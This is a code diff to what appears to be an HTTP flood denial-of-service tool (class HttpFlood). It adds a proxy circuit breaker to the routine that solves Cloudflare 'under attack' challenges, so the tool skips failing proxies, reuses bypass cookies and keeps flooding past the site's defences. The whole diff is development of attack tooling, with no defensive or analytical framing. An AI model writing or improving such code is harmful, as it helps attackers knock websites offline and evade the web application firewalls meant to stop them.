@@ -60,6 +60,7 @@ from urllib.parse import urlparse
 from uuid import UUID, uuid4
 import traceback
 from src.core.debugger import BypassDebugger
+from src.core.proxy_guard import ProxyCircuitBreaker
 
 import psutil
 import requests
@@ -3543,6 +3544,7 @@ class HttpFlood:
     _curl_cffi_sem = asyncio.Semaphore(500)
     _sample_count = 0
     _waf_blocks = 0
+    _circuit_breaker = ProxyCircuitBreaker(failure_threshold=3, recovery_timeout=60.0)
     
     _payload: str
     _defaultpayload: Any
@@ -4418,23 +4420,44 @@ class HttpFlood:
                 # Double-checked locking with 60s cooldown between re-solve attempts
                 if (not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry) and (now - getattr(HttpFlood, '_last_solve_attempt', 0) > 60):
                     HttpFlood._last_solve_attempt = now
-                    proxy_str = str(self._proxy_pool.get_proxy()) if self._proxy_pool else None
+                    proxy_str = None
+                    if self._proxy_pool:
+                        for _ in range(50):
+                            candidate = self._proxy_pool.get_proxy()
+                            if candidate:
+                                cand_str = str(candidate)
+                                if HttpFlood._circuit_breaker.is_available(cand_str):
+                                    proxy_str = cand_str
+                                    break
+                            else:
+                                break
+                        if not proxy_str:
+                            candidate = self._proxy_pool.get_proxy()
+                            if candidate:
+                                proxy_str = str(candidate)
                     # Try with latest ML User-Agent
                     ua_target = ML_ENGINE.get_fingerprint()["ua"]
                     cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
                     
+                    used_proxy = proxy_str
                     if not cookie and proxy_str:
                         logger.warning(f"{bcolors.WARNING}[!] CFBUAM: Solve failed with proxy. Retrying without proxy...{bcolors.RESET}")
+                        await HttpFlood._circuit_breaker.register_failure(proxy_str)
+                        used_proxy = None
                         cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), user_agent=ua_target)
 
                     if cookie == "proxy_error":
+                        if proxy_str:
+                            await HttpFlood._circuit_breaker.register_failure(proxy_str)
                         HttpFlood._cfbuam_cookie = None
                         HttpFlood._last_solve_attempt = 0
                         return
                     elif cookie:
+                        if used_proxy:
+                            await HttpFlood._circuit_breaker.register_success(used_proxy)
                         HttpFlood._cfbuam_cookie = cookie
                         if ua: HttpFlood._cfbuam_ua = ua
-                        HttpFlood._cfbuam_proxy = proxy_str
+                        HttpFlood._cfbuam_proxy = used_proxy
                         HttpFlood._cfbuam_expiry = now + 900 # 15 mins
                     else:
                         HttpFlood._cfbuam_cookie = "_yummy=choco" # Fallback
